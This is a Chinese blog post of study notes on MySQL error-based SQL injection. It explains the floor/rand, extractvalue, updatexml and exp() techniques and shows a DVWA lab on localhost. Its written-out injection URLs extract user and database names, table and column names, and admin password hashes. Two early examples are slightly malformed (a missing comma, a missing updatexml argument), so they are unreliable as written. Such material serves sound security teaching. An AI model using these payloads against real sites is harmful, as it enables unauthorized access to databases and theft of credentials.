---
title: 《Web攻防安全实战》学习总结：SQL注入实战——数据库报错注入
date: 2021-01-17 16:02:24
index_img: /img/websecurity.png
banner_img: /img/websecurity.png
tags:
  - 安全
  - Web安全
categories:
  - Web安全
  - SQL注入
---
# 报错注入
## MySQL报错注入主要分类
1、BigInt等数据类型溢出
2、Xpath语法错误
3、count() + rand() + group_by()导致重复
4、空间数据类型函数错误

## 报错注入常用函数
### 1、floor函数
#### 相关函数：
```
floor(): 去除小数部分
count(x): 返回x数据集的数量
rand(): 产生随机数
rand(x): 每个x对应一个固定的值，但是如果连续执行多次值会变化，不过也是可预测的
floor(rand(0)*2):对应的有规律数列为 011011...
```
#### 注入SQL：
```
select count(*) ,concat(database(),floor(rand(0)*2))x from test group by x ：x表示前面括号内的别名
```
#### 报错信息：
```
Can't write；duplicate key in table ‘/tmp/#sql935_27_2f’
```
#### 原理剖析：
该注入的关键函数是group by x，即group by (floor(rand(0)*2))；首先明白两个概念：group by查询会新建一张虚拟表，保存查询的结果，而rand函数每被调用一次就会进行一次计算。
如下图，sql语句第一次执行时，floor(rand(0)*2)=0，查询虚拟表主键0，不存在，判断直接插入，在插入时会在group by x再次计算floor(rand(0)*2)=1，因此实际插入的主键值=1；第二次查询时floor(rand(0)*2)=1，主键存在，主键直接+1插入即可；再次进行floor(rand(0)*2)计算，此时是floor(rand(0)*2)的第四次运算，值为0，需要插入主键为0的数据，和第一次插入一样，执行过程会运行group by x，实际插入的主键值变成1，导致主键重复，数据库报错。
![fileupload](/img/sql/errorbase/error1.png)

### 2、extractvalue函数（最多32字符）
extractvalue() :对XML文档进行查询的函数

其实就是相当于我们熟悉的HTML文件中用 <div><p><a>标签查找元素一样
语法：extractvalue(目标xml文档，xml路径)

第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，
如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。
正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错
#### 注入SQL：
```
?id=1' and extractvalue(1, concat(0x7e (select @@version))) --'
```
#### 原理剖析：
使用concat函数，将错误信息进行拼接，使用0x7e波浪号，extractvalue函数无法处理的字符，防止select @@version 被截断
![fileupload](/img/sql/errorbase/error2.png)

### 3、updatexml函数
updatexml()函数与extractvalue()类似，是更新xml文档的函数。
语法updatexml(目标xml文档，xml路径，更新的内容)

extractvalue()、updatexml()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位
#### 注入SQL：
```
?id=2' and updatexml(1, concat(0x7e (select @@version))) --'
```

### 4、exp()函数
#### 相关函数
～():取反函数，例如一个正数取反，会变成一个负数，负数用数字形式表示是一个很庞大的数字，传入exp会导致exp函数无法处理从而报错，如下图：
![fileupload](/img/sql/errorbase/error3.png)
注意，exp()产生错误，只会返回执行语句的表达式，需要联合后端脚本语言进行解析，从而返回相应的执行结果
## 报错注入实战
### 使用extractvalue()函数获取用户和数据库名
```
http://127.0.0.1:8881/vulnerabilities/sqli/?id=' and extractvalue(1, concat(0x7e, user(), 0x7e,database())) -- &Submit=Submit#
```
![fileupload](/img/sql/errorbase/error4.png)

### 使用floor函数获取用户表名
```
http://127.0.0.1:8881/vulnerabilities/sqli/?id=' union select 1,2 from (select count(*), concat((select table_name from information_schema.tables where table_schema='dvwa' limit 2, 1),'|',floor(rand(0)*2))x from information_schema.tables group by x)a -- &Submit=Submit#
```
![fileupload](/img/sql/errorbase/error5.png)

### 使用extractvalue()函数获取用户表字段
```
http://127.0.0.1:8881/vulnerabilities/sqli/?id=' and extractvalue(1, concat(0x7e, (select column_name from information_schema.columns where table_name='users' limit 3,1))) -- &Submit=Submit#
```
![fileupload](/img/sql/errorbase/error8.png)

### 使用floor函数获取用户名密码
```
http://127.0.0.1:8881/vulnerabilities/sqli/?id=' union select 1,2 from (select count(*), concat((select user from dvwa.users limit 0,1),'|',    floor(rand(0)*2))x from information_schema.tables group by x)a -- &Submit=Submit#

http://127.0.0.1:8881/vulnerabilities/sqli/?id=' union select 1,2 from (select count(*), concat((select password from dvwa.users limit 0,1),'|',    floor(rand(0)*2))x from information_schema.tables group by x)a -- &Submit=Submit#
```
![fileupload](/img/sql/errorbase/error6.png)
![fileupload](/img/sql/errorbase/error7.png)

⚠️注意：使用extractvalue函数获取密码时，最大长度为32位，密码hash很有可能被截断，导致获取不全，需要结合mid函数获取。
```
# 第一次获取前29位
http://127.0.0.1:8881/vulnerabilities/sqli/?id=' and extractvalue(1, mid(concat(0x7e,(select password from dvwa.users limit 0,1)),1,29)) -- &Submit=Submit#
# 第二次从第29位获取29位
http://127.0.0.1:8881/vulnerabilities/sqli/?id=' and extractvalue(1, mid(concat(0x7e,(select password from dvwa.users limit 0,1)),29,29)) -- &Submit=Submit#
```
![fileupload](/img/sql/errorbase/error9.png)
![fileupload](/img/sql/errorbase/error10.png)
两次结果拼接和floor函数取出的admin密码一致。
